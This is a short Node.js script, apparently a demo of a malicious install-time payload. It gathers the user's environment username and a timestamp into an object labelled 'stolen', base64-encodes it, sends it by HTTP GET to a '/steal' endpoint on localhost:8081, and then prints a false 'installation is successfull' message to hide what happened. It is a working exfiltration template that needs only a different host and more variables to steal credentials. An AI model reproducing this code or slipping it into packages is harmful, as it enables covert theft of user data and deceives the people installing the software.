const http = require('http');
const stolen = {
    user: process.env.USER || 'unknown',
    time: Date.now().toString()
};

const encoded = Buffer.from(JSON.stringify(stolen)).toString('base64');

http.get(`http://localhost:8081/steal?data=${encoded}`, (res) => {

    res.on('data', () => {});
    res.on('end', () => { console.log("installation is successfull");
    });
}).on('error', (err) => {
    console.error("Error sending stolen data: ", err);
});